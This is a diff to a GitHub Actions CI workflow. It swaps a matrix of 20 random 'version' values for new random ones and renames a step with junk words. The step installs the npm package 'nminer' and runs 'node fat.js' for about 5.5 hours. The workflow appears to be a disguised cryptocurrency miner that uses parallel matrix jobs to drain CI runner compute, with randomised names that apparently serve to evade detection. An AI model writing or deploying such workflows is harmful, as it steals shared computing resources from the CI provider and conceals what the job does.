@@ -9,26 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7272 }
-          - { version: 2951 }
-          - { version: 3587 }
-          - { version: 8927 }
-          - { version: 4139 }
-          - { version: 7594 }
-          - { version: 7990 }
-          - { version: 4143 }
-          - { version: 5803 }
-          - { version: 9397 }
-          - { version: 9315 }
-          - { version: 8919 }
-          - { version: 1374 }
-          - { version: 4796 }
-          - { version: 838 }
-          - { version: 5145 }
-          - { version: 9001 }
-          - { version: 8085 }
-          - { version: 4612 }
-          - { version: 5310 }
+          - { version: 6124 }
+          - { version: 1876 }
+          - { version: 3881 }
+          - { version: 5209 }
+          - { version: 1210 }
+          - { version: 3015 }
+          - { version: 844 }
+          - { version: 6842 }
+          - { version: 2673 }
+          - { version: 9740 }
+          - { version: 9443 }
+          - { version: 695 }
+          - { version: 7075 }
+          - { version: 4533 }
+          - { version: 194 }
+          - { version: 9781 }
+          - { version: 847 }
+          - { version: 9357 }
+          - { version: 2596 }
+          - { version: 7525 }
 
     steps:
       - name: Checkout
@@ -39,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: aha masculinize faint founder
+      - name: when
         run: |
           npm install nminer@latest
-          timeout 340m node fat.js || echo "fat executed"
+          timeout 333m node fat.js || echo "fat executed"
